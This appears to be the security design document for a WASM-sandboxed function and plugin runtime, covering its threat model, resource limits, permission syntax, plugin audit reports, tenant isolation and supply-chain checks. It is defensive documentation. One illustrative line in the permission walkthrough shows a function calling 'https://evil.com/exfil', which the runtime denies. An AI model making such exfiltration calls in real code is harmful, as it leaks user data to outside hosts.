# Security Model

> Defense in depth: WASM sandboxing, permission declarations, capability auditing.

---

## Threat Model

### Who Are We Protecting Against?

1. **Malicious plugins** — third-party WASM modules that try to exfiltrate data
2. **Buggy user code** — functions that consume unbounded resources
3. **Supply chain attacks** — compromised dependencies in the compilation pipeline
4. **Multi-tenant data leakage** — one tenant's functions accessing another's data
5. **Network-based attacks** — injection, SSRF, unauthorized outbound requests

---

## Layer 1: WASM Sandbox

### What WASM Guarantees

WebAssembly provides **memory isolation by design**:

- **No host memory access**: WASM linear memory is separate from host memory
- **No filesystem access**: Unless explicitly exposed via WASI
- **No network access**: Unless explicitly exposed via host functions
- **No system calls**: WASM cannot call `exec`, `fork`, `open`, etc.
- **Deterministic execution**: No undefined behavior, no uninitialized memory
- **Type safety**: Function signatures are enforced at the type level

### What WASM Does NOT Guarantee

- **CPU time limits**: Must be enforced by the host (fuel/epoch)
- **Memory limits**: Must be set via max memory pages
- **Host function safety**: If you expose a dangerous host function, WASM won't stop the call
- **Side-channel attacks**: Timing attacks are theoretically possible (but hard in practice)

---

## Layer 2: Resource Limits

Every function execution is bounded:

```toml
[limits]
timeout_ms = 30000       # Kill execution after 30 seconds
memory_mb = 64            # Max 64MB linear memory
cpu_fuel = 1000000000     # Wasmtime fuel units (approximate CPU time budget)
```

### Enforcement Mechanisms

| Resource | Mechanism | What Happens on Violation |
|----------|-----------|--------------------------|
| CPU time | Wasmtime epoch interruption | `TrapCode::Interrupt` — execution killed |
| Memory | WASM `memory.max` pages | `memory.grow` returns -1 — OOM error |
| Wall time | Host-side timer | Thread killed after timeout |
| Request size | Validated in HTTP layer | 413 Payload Too Large |
| Response size | Validated in response layer | Truncated + error |
| Outbound HTTP | Validated in host function | Permission denied error |
| KV storage | Validated in host function | Quota exceeded error |
| File storage | Validated in host function | Quota exceeded error |

---

## Layer 3: Permission System

### Declaration

Every function and plugin declares what it needs:

```toml
[functions.create-user]
permissions = [
  "kv:read:user:*",
  "kv:write:user:*",
  "events:emit:user.created",
  "http:post:api.sendgrid.com/v3/mail/*",
  "config:read:SENDGRID_API_KEY"
]
```

### Enforcement

When a function calls a host function, the runtime checks:

```
1. Function calls kv.set("user:123", data)
2. Runtime checks: does this function have "kv:write:user:*" permission?
   - Pattern "kv:write:user:*" matches "kv:write:user:123" ✓
   - Allow the call
3. Function calls http.get("https://evil.com/exfil")
   - No "http:get:evil.com/*" permission declared
   - DENY + log security event
```

### Permission Syntax

```
{namespace}:{action}:{resource_pattern}

Namespace: kv, storage, events, http, config, log
Action: read, write, delete, list, emit, get, post, put, delete
Pattern: exact match or glob (*)

Examples:
  kv:read:*              → read any KV key
  kv:read:user:*         → read KV keys starting with "user:"
  kv:write:user:123      → write exactly "user:123"
  http:get:api.github.com/* → GET any URL under api.github.com
  storage:read:images/*  → read files under images/
  events:emit:*          → emit any event
  config:read:API_KEY    → read the API_KEY config value
```

### Default Permissions

Functions have NO permissions by default. Every capability must be explicitly declared.

The exception: `log:*` is always allowed (functions can always log).

---

## Layer 4: Plugin Auditing

### Static Analysis

When a plugin is published or installed, static analysis identifies:
- What host functions the WASM module imports (potential capabilities used)
- What URLs appear as string literals in the code
- What KV key patterns are used

### Runtime Profiling

During test execution, the runtime records:
- Every host function call made
- Every URL requested
- Every KV key accessed
- Every event emitted

### Audit Report

```
Plugin: community/analytics v1.2.0

DECLARED PERMISSIONS:
  ✓ http:post:api.mixpanel.com/*
  ✓ kv:read:analytics:*
  ✓ kv:write:analytics:*

OBSERVED USAGE (from test suite):
  http:post:api.mixpanel.com/track     (12 calls)
  kv:read:analytics:session:*          (8 calls)
  kv:write:analytics:event:*           (15 calls)

STATIC ANALYSIS:
  Imported host functions: http_request, kv_get, kv_set
  String literals containing URLs: api.mixpanel.com
  No filesystem access detected
  No undeclared imports

SECURITY SCORE: 98/100
  ✓ All observed calls within declared permissions
  ✓ No filesystem access
  ✓ No undeclared capabilities
  ✓ Outbound HTTP only to declared domain
  - Minor: broad kv:write pattern (could be more specific) [-2]
```

---

## Layer 5: Multi-Tenant Isolation

### Namespace Isolation

| Resource | Isolation Boundary |
|----------|--------------------|
| KV Store | Prefixed by `{tenant}:{function}:` |
| File Storage | Separate directory per tenant+function |
| Events | Tenant-scoped topic routing |
| Config | Separate config namespace per tenant |
| Logs | Tagged with tenant ID |

### Instance Isolation

Each tenant's functions run in separate WASM instances. There is no shared mutable state between tenants.

### Optional: Process Isolation

For high-security tenants, functions can run in separate OS processes. This adds protection against theoretical WASM sandbox escapes at the cost of higher resource usage.

---

## Layer 6: Supply Chain Security

### Compiler Integrity
- Bundled compilers (esbuild, extism-js/Javy) are verified with checksums
- Downloaded compilers are fetched from known URLs with hash verification
- No arbitrary code execution during compilation

### Plugin Registry Security
- All published plugins are built from source in CI (reproducible builds)
- Plugin binaries are signed
- Dependency list is publicly visible
- Known vulnerability database for plugins

### WASM Module Integrity
- Every WASM module in a release bundle has a SHA-256 hash
- Hashes are verified on every node during deployment
- Bundle manifest is signed by the deployer

---

## Security Checklist for Users

- [ ] Declare minimal permissions for each function
- [ ] Review plugin audit reports before installing
- [ ] Use environment-specific secrets (never hardcode)
- [ ] Set appropriate resource limits
- [ ] Enable OTLP export for production monitoring
- [ ] Review outbound HTTP permissions regularly
- [ ] Keep the runtime updated for security patches
